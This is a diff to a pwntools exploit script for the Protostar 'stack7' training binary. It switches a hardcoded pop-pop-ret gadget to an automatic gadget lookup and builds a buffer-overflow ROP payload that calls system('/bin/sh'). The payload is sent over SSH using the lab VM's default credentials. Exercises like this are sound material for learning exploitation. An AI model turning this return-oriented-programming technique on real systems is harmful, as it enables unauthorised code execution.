@@ -13,9 +13,13 @@ elf.symbols = {'system': system, 'binsh': binsh}
 
 offset = 80
 rop = ROP(elf)
-gadget = 0x08048492     # pop pop ret gadget, can be done by:
+                        # gadget = 0x08048492     
+                        # pop pop ret gadget, can be done by:
                         # msfelfscan -p <binary> ,or objdump -d
                         # or ROPgadget --binary stack7 | grep pop
+                        # you can find it also like this below
+
+gadget = rop.find_gadget([u'pop ebx', u'pop ebp'])[0]
 rop.raw(gadget)
 rop.raw(0x2BadCafe)
 rop.raw(0xBabeFace)
@@ -29,7 +33,7 @@ if len(sys.argv) < 2:
 else:
     s = ssh("user", sys.argv[1], 22, password="user")
     payload = 'A' * offset
-    payload += str(rop)
+    payload += rop.chain()
     r = s.run('/opt/protostar/bin/stack7')
     print(r.recv(1024))
     r.send(payload+ '\n')
